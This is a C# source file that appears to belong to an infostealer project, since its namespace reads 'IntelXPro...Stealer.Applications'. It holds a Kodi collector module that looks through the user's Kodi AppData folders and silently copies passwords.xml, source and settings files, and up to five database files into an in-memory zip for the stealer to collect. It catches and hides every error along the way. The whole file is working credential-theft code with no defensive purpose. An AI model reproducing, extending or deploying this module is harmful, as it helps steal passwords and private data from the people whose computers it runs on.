using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Kodi : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Kodi");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Kodi");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Kodi";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string userdataPath = Path.Combine(basePath, "userdata");
                if (Directory.Exists(userdataPath))
                {
                    string[] configFiles = new string[]
                    {
                        "sources.xml",
                        "passwords.xml",
                        "advancedsettings.xml",
                        "guisettings.xml"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(userdataPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\Kodi\\{location}\\userdata\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string databasePath = Path.Combine(userdataPath, "Database");
                    if (Directory.Exists(databasePath))
                    {
                        string[] dbFiles = Directory.GetFiles(databasePath, "*.db", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in dbFiles.Take(5))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\Kodi\\{location}\\userdata\\Database\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
